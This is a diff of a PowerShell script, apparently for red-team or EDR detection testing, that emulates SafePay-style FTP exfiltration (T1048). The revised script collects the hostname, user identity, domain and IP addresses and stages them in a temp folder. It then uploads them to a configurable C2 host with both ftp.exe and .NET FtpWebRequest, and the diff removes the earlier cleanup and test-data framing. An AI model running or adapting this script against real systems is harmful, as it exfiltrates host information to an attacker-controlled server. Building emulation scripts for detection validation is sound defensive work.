@@ -1,78 +1,69 @@
 <#
 .SYNOPSIS
-    SafePay FTP Exfiltration - DETECTION TRIGGER  
+    SafePay FTP Exfiltration - DETECTION TRIGGER
 .DESCRIPTION
-    Exfiltrates test data via FTP connection.
-    Will trigger EDR detection for T1048.
+    Exfiltrates data via FTP protocol.
     TTP: T1048
-.PARAMETER FTPServer
-    Target FTP server IP address
 #>
-param(
-    [Parameter(Mandatory=$false)]
-    [string]$FTPServer = "10.0.0.1"
-)
+$ErrorActionPreference = "SilentlyContinue"
+$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
 
 Write-Host "[*] Starting SafePay FTP Exfiltration (T1048)" -ForegroundColor Cyan
-Write-Host "[*] Target FTP: $FTPServer" -ForegroundColor Yellow
-Write-Host "[*] This will trigger EDR detection for exfiltration" -ForegroundColor Yellow
 
-try {
-    # Create test data to exfiltrate
-    $testDataPath = "$env:TEMP\rtl_exfil_test.txt"
-    $testData = @"
-RTL Test Exfiltration Data
-========================
-Hostname: $env:COMPUTERNAME
-Username: $env:USERNAME
-Domain: $env:USERDOMAIN
-Timestamp: $(Get-Date)
-This is test data for EDR detection validation.
+# Step 1: Collect data
+Write-Host "`n[*] [T1005] Collecting data for exfiltration..."
+$stagingDir = "C:\temp\safepay_staging"
+if (-not (Test-Path $stagingDir)) { New-Item -Path $stagingDir -ItemType Directory -Force | Out-Null }
+
+$exfilData = @"
+=== SAFEPAY EXFIL DATA ===
+Hostname: $(hostname)
+User: $(whoami)
+Domain: $($env:USERDOMAIN)
+IP: $(ipconfig | Select-String "IPv4" | Out-String)
 "@
-    
-    $testData | Out-File $testDataPath -Force
-    Write-Host "[*] Created test exfil data at: $testDataPath"
-    
-    # ACTUAL DETECTION TRIGGER - FTP connection attempt
-    Write-Host "[*] Attempting FTP connection to $FTPServer..."
-    
-    # Method 1: FTP via .NET WebClient
-    try {
-        $ftpUri = "ftp://${FTPServer}/rtl_test_upload.txt"
-        $webclient = New-Object System.Net.WebClient
-        $webclient.Credentials = New-Object System.Net.NetworkCredential("anonymous", "test@test.com")
-        
-        Write-Host "[*] Executing: WebClient.UploadFile($ftpUri)"
-        $webclient.UploadFile($ftpUri, $testDataPath)
-        Write-Host "[+] FTP upload attempted" -ForegroundColor Green
-    } catch {
-        Write-Host "[-] FTP WebClient failed (expected if no FTP server): $_" -ForegroundColor Yellow
-    }
-    
-    # Method 2: Native ftp.exe command (generates process execution detection)
-    Write-Host "[*] Also running: ftp.exe connection attempt"
-    
-    $ftpScript = @"
-open $FTPServer
-user anonymous test@test.com
-put $testDataPath
+$dataFile = "$stagingDir\exfil_data.txt"
+$exfilData | Out-File $dataFile -Encoding ASCII
+Write-Host "    [+] Data collected: $dataFile" -ForegroundColor Green
+
+# Step 2: Create FTP script file
+Write-Host "`n[*] [T1048] Creating FTP exfiltration script..."
+$ftpScript = @"
+open $C2Host
+anonymous
+anonymous@test.lab
+binary
+put $dataFile exfil_upload.txt
 quit
 "@
+$ftpScriptPath = "$stagingDir\ftp_script.txt"
+$ftpScript | Out-File $ftpScriptPath -Encoding ASCII
+Write-Host "    [+] FTP script: $ftpScriptPath" -ForegroundColor Green
+
+# Step 3: Execute FTP exfiltration
+Write-Host "`n[*] [T1048] Executing FTP exfiltration..."
+Write-Host "    CMD: ftp -s:$ftpScriptPath"
+ftp -s:$ftpScriptPath 2>&1 | ForEach-Object { Write-Host "    $_" }
+
+# Step 4: Alternative - PowerShell FTP upload
+Write-Host "`n[*] [T1048] Attempting PowerShell FTP upload..."
+Write-Host "    CMD: [System.Net.FtpWebRequest]::Create ftp://$C2Host/upload"
+try {
+    $ftpUrl = "ftp://$C2Host/exfil_upload.txt"
+    $req = [System.Net.FtpWebRequest]::Create($ftpUrl)
+    $req.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
+    $req.Credentials = [System.Net.NetworkCredential]::new("anonymous", "test@test.lab")
+    $req.Timeout = 5000
     
-    $ftpScriptPath = "$env:TEMP\rtl_ftp_script.txt"
-    $ftpScript | Out-File $ftpScriptPath -Force
+    $fileContent = [System.IO.File]::ReadAllBytes($dataFile)
+    $stream = $req.GetRequestStream()
+    $stream.Write($fileContent, 0, $fileContent.Length)
+    $stream.Close()
     
-    # Run FTP command (this triggers the detection even if it fails)
-    Start-Process "ftp.exe" -ArgumentList "-s:$ftpScriptPath" -Wait -NoNewWindow -ErrorAction SilentlyContinue
-    
-    # Cleanup
-    Remove-Item $ftpScriptPath -Force -ErrorAction SilentlyContinue
-    Remove-Item $testDataPath -Force -ErrorAction SilentlyContinue
-    
-    Write-Host "[!] CrowdStrike should detect: 'DataExfiltration' or 'SuspiciousFTPActivity'" -ForegroundColor Magenta
-    
+    Write-Host "    [+] FTP upload completed" -ForegroundColor Green
 } catch {
-    Write-Host "[!] Error: $_" -ForegroundColor Red
+    Write-Host "    [-] FTP upload failed (expected without server): $_" -ForegroundColor Gray
 }
 
-Write-Host "`n[*] Detection should appear in CrowdStrike within 1-2 minutes" -ForegroundColor Cyan
+Write-Host "`n[+] FTP Exfiltration Complete." -ForegroundColor Green
+Write-Host "[!] Check EDR for: FTP execution, data staging, FTP script file creation" -ForegroundColor Magenta
